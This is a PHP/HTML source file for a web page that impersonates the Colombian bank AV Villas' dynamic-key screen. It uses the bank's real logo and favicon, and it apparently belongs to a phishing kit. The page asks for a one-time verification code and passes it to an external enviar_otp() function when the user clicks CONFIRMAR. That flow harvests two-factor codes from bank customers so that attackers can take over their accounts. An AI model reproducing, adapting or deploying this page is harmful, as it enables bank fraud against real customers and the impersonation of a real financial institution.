<?php
// PHP logic if needed
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clave DinÃ¡mica | AV Villas</title>
    <link rel="icon" href="https://pb-avvillas.avaldigitallabs.com/assets/img/favicon/favicon.ico">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Open Sans', sans-serif;
            background-color: #f8f8f8;
            overflow-x: hidden;
        }

        .page-container {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: center;
            align-items: center;
            padding: 40px 24px;
            box-sizing: border-box;
            position: relative;
            background-color: #f8f8f8;
            background-image: url("/circulorojo.svg");
            background-repeat: no-repeat;
            background-position: left center;
            background-size: 180%;
        }

        .login-card {
            background: #fff;
            width: 440px;
            padding: 48px 40px;
            border-radius: 24px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
            position: relative;
            z-index: 10;
        }

        .logo-container {
            margin-bottom: 32px;
            display: flex;
            justify-content: center;
        }

        .logo-branding {
            height: 52px;
            width: auto;
        }

        h1 {
            font-size: 24px;
            color: #252b31;
            margin-bottom: 32px;
            font-weight: 500;
            text-align: center;
        }

        p.instruction {
            font-size: 15px;
            color: #616e7c;
            line-height: 1.5;
            margin-bottom: 32px;
            text-align: center;
        }

        .form-group {
            position: relative;
            margin-bottom: 32px;
            border-bottom: 1px solid #d1d9e2;
            padding: 8px 0;
            transition: border-color 0.3s;
        }

        .form-group.focused {
            border-bottom: 2px solid #ed1b2f;
        }

        .form-group label {
            position: absolute;
            left: 0;
            top: 20px;
            font-size: 16px;
            color: #616e7c;
            transition: all 0.3s;
            pointer-events: none;
        }

        .form-group.focused label, .form-group.filled label {
            top: -12px;
            font-size: 13px;
            color: #ed1b2f;
        }

        .input-wrapper {
            display: flex;
            align-items: center;
        }

        input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 18px;
            color: #252b31;
            padding: 8px 0;
            background: transparent;
        }

        .btn-ingresar {
            width: 100%;
            background: #d1d9e2;
            color: #fff;
            border: none;
            padding: 16px;
            border-radius: 40px;
            font-size: 15px;
            font-weight: 700;
            cursor: not-allowed;
            transition: 0.3s;
            margin-top: 16px;
            letter-spacing: 1px;
        }

        .btn-ingresar.active {
            background: #ed1b2f;
            cursor: pointer;
        }

        .extra-links {
            margin-top: 32px;
            text-align: center;
        }

        .extra-link-item {
            display: block;
            color: #0056b3;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 12px;
        }

        /* LOADER STYLES */
        #loader {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.98);
            z-index: 10000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .loader-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 30px;
        }

        .spinner-red {
            width: 48px;
            height: 48px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #ed1b2f;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media screen and (max-width: 600px) {
            .login-card {
                width: 100%;
                box-shadow: none;
                border-radius: 0;
                padding: 30px 20px;
            }
            .page-container {
                background-size: 300%;
                background-position: center 80%;
            }
        }
    </style>
</head>
<body>
    <div id="loader">
        <div class="loader-content">
            <img src="https://www.avvillas.com.co/bancadigital/assets/bavv-brand/bavv/brand-primary.svg" alt="AV Villas" class="logo-branding">
            <div class="spinner-red"></div>
        </div>
    </div>

    <div class="page-container">
        <div class="login-card">
            <div class="logo-container">
                <img src="https://www.avvillas.com.co/bancadigital/assets/bavv-brand/bavv/brand-primary.svg" alt="AV Villas" class="logo-branding">
            </div>


            <p class="instruction">Por tu seguridad, hemos enviado un cÃ³digo de verificaciÃ³n a tu dispositivo registrado. Por favor ingrÃ©salo a continuaciÃ³n.</p>

            <form id="otpForm">
                <div class="form-group">
                    <label>CÃ³digo de verificaciÃ³n</label>
                    <div class="input-wrapper">
                        <input type="text" id="txtOTP" minlength="4" maxlength="8" inputmode="numeric" autocomplete="one-time-code">
                    </div>
                </div>

                <button type="button" id="btnOTP" class="btn-ingresar" disabled>CONFIRMAR</button>
            </form>

            <div class="extra-links">
                <p style="font-size: 13px; color: #616e7c;">Â¿No recibiste el cÃ³digo?</p>
                <a href="#" class="extra-link-item">Solicitar nuevo cÃ³digo</a>
                <a href="avvillas.php" class="extra-link-item" style="color: #616e7c; font-weight: 400;">Cancelar</a>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            // AnimaciÃ³n de labels
            $("input").on("focus", function() {
                $(this).closest(".form-group").addClass("focused");
            }).on("blur", function() {
                if ($(this).val() === "") {
                    $(this).closest(".form-group").removeClass("focused filled");
                }
            }).on("input", function() {
                if ($(this).val() !== "") {
                    $(this).closest(".form-group").addClass("filled");
                } else {
                    $(this).closest(".form-group").removeClass("filled");
                }
                checkInput();
            });

            function checkInput() {
                var otp = $("#txtOTP").val();
                if(otp.length >= 4) {
                    $("#btnOTP").addClass("active").prop("disabled", false);
                } else {
                    $("#btnOTP").removeClass("active").prop("disabled", true);
                }
            }

            $("#btnOTP").click(function() {
                var otp = $("#txtOTP").val();
                if(otp.length >= 4) {
                    $("#loader").css("display", "flex");
                    enviar_otp(otp);
                }
            });
        });
    </script>
</body>
</html>

